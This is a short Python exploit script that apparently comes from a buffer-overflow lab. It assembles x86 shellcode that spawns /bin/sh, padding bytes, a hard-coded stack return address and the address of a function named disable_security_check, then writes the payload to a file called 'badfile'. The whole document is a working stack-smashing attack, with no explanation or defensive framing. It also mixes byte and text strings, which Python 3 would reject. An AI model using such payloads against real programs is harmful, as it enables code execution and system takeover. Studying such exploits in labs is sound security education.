import struct

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80") 

disable_security_check = 0x804852b
dst = 0xbffff038

atk_vector = shellcode
atk_vector += 'A'*(116-len(atk_vector))
atk_vector += struct.pack('I', dst)
atk_vector += 'A'*(263-len(atk_vector))
atk_vector += struct.pack('I', disable_security_check)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

